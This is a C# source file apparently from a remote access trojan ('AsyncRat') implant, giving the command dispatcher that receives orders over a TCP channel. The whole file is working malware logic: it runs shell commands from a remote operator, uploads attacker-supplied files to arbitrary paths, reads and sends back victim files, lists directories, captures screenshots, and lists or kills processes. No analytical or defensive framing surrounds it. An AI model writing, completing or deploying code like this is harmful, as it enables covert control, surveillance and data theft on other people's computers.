using System.Text;
using AsyncRat.Client.Modules;
using AsyncRat.Client.Network;

namespace AsyncRat.Client.Implant;

public sealed class TaskExecutor
{
    private readonly TcpChannel _channel;
    private readonly ReverseShell _shell = new();
    private readonly FileManager _files = new();
    private readonly ScreenCapture _screen = new();
    private readonly ProcessManager _procs = new();

    public TaskExecutor(TcpChannel channel)
    {
        _channel = channel;
    }

    public async Task RunAsync(CancellationToken ct = default)
    {
        while (!ct.IsCancellationRequested && _channel.IsConnected)
        {
            var packet = await _channel.ReceiveAsync(ct);
            if (packet.Length == 0) continue;

            var response = Dispatch(packet);
            await _channel.SendAsync(response, ct);
        }
    }

    private byte[] Dispatch(byte[] packet)
    {
        var text = Encoding.UTF8.GetString(packet);
        var sep = text.IndexOf('|');
        var cmd = sep >= 0 ? text[..sep] : text;
        var arg = sep >= 0 ? text[(sep + 1)..] : string.Empty;

        return cmd.ToUpperInvariant() switch
        {
            "SHELL"      => Encoding.UTF8.GetBytes(_shell.Execute(arg)),
            "UPLOAD"     => HandleUpload(arg),
            "DOWNLOAD"   => _files.ReadFile(arg),
            "DIR"        => Encoding.UTF8.GetBytes(_files.ListDirectory(arg)),
            "SCREENSHOT" => _screen.Capture(),
            "PS"         => Encoding.UTF8.GetBytes(_procs.ListProcesses()),
            "KILL"       => Encoding.UTF8.GetBytes(
                                int.TryParse(arg, out var pid)
                                    ? _procs.KillProcess(pid)
                                    : "ERR|Invalid PID"),
            "PING"       => Encoding.UTF8.GetBytes("PONG"),
            _            => Encoding.UTF8.GetBytes($"ERR|Unknown command: {cmd}"),
        };
    }

    private byte[] HandleUpload(string arg)
    {
        var sep = arg.IndexOf('|');
        if (sep < 0) return Encoding.UTF8.GetBytes("ERR|Format: UPLOAD|path|base64data");
        var path = arg[..sep];
        var data = Convert.FromBase64String(arg[(sep + 1)..]);
        _files.WriteFile(path, data);
        return Encoding.UTF8.GetBytes($"OK|Written {data.Length} bytes to {path}");
    }
}
